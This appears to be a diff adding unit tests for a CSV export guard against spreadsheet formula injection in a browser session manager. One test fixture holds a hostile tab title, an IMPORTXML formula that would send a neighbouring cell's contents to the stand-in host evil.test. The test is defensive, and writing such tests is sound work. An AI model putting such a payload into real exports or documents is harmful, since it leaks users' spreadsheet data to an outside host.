@@ -3,6 +3,7 @@ import type { Session } from '@/types';
 import {
   CSV_HEADER,
   csvEscape,
+  csvGuardFormula,
   escapeHtml,
   exportFilename,
   extensionFor,
@@ -85,6 +86,26 @@ describe('csvEscape', () => {
   });
 });
 
+describe('csvGuardFormula', () => {
+  it('neutralises every leading character a spreadsheet would treat as a formula', () => {
+    for (const risky of ['=', '+', '-', '@', '\t', '\r']) {
+      expect(csvGuardFormula(`${risky}cmd(1)`)).toBe(`'${risky}cmd(1)`);
+    }
+  });
+
+  it('leaves ordinary text alone', () => {
+    expect(csvGuardFormula('')).toBe('');
+    expect(csvGuardFormula('Inbox (12) - Mail')).toBe('Inbox (12) - Mail');
+    expect(csvGuardFormula('https://a.test/?a=1')).toBe('https://a.test/?a=1');
+    // Only the FIRST character decides; a formula character further in is harmless.
+    expect(csvGuardFormula('2+2=4')).toBe('2+2=4');
+  });
+
+  it('is independent of RFC 4180 quoting: a risky field that also needs quotes gets both', () => {
+    expect(csvEscape(csvGuardFormula('=SUM(A1,A2)'))).toBe(`"'=SUM(A1,A2)"`);
+  });
+});
+
 describe('toCsv', () => {
   it('writes the header and one row per tab in strip order with 1-based positions', () => {
     expect(toCsv([work, play])).toBe(
@@ -127,7 +148,87 @@ describe('toCsv', () => {
       `${CSV_HEADER}\n"Read, later",1,"Q&A ""group""",1,false,"Multi\nline","https://x.test/?a=1,2"\n`,
     );
   });
+
+  it('guards a hostile page title (and url) against spreadsheet formula injection', () => {
+    const hostile: Session = {
+      ...play,
+      name: '@Session',
+      windows: [
+        {
+          state: 'normal',
+          focused: true,
+          groups: [{ title: '+Group', color: 'grey', collapsed: false }],
+          tabs: [
+            {
+              // A site chooses its own document.title; this one would read the neighbouring cell.
+              url: 'https://evil.test/',
+              title: '=IMPORTXML("https://evil.test/?d="&A1,"//a")',
+              pinned: false,
+              active: true,
+              groupIndex: 0,
+            },
+            { url: '-tel:+1', title: 'Plain', pinned: false, active: false },
+          ],
+        },
+      ],
+    };
+
+    const rows = parseCsv(toCsv([hostile]));
+    // Round trip: a CSV parser gives back exactly the original text with the one guard apostrophe
+    // in front of it (a spreadsheet consumes that apostrophe and shows the text as the page wrote
+    // it, but as text — never as a formula).
+    expect(rows[1]).toEqual([
+      "'@Session",
+      '1',
+      "'+Group",
+      '1',
+      'false',
+      '\'=IMPORTXML("https://evil.test/?d="&A1,"//a")',
+      'https://evil.test/',
+    ]);
+    expect(rows[2]).toEqual(["'@Session", '1', '', '2', 'false', 'Plain', "'-tel:+1"]);
+  });
 });
+
+/** Minimal RFC 4180 reader, so the round trip above is checked by a parser and not by eye. */
+function parseCsv(text: string): string[][] {
+  const rows: string[][] = [];
+  let row: string[] = [];
+  let field = '';
+  let quoted = false;
+  for (let i = 0; i < text.length; i++) {
+    const char = text[i];
+    if (quoted) {
+      if (char !== '"') {
+        field += char;
+      } else if (text[i + 1] === '"') {
+        field += '"';
+        i += 1;
+      } else {
+        quoted = false;
+      }
+      continue;
+    }
+    if (char === '"' && field === '') {
+      quoted = true;
+    } else if (char === ',') {
+      row.push(field);
+      field = '';
+    } else if (char === '\n') {
+      row.push(field);
+      rows.push(row);
+      row = [];
+      field = '';
+    } else {
+      field += char;
+    }
+  }
+  if (field !== '' || row.length > 0) {
+    row.push(field);
+    rows.push(row);
+  }
+  return rows;
+}
 
 describe('toJson', () => {
   it('wraps the sessions in a pretty-printed export bundle', () => {
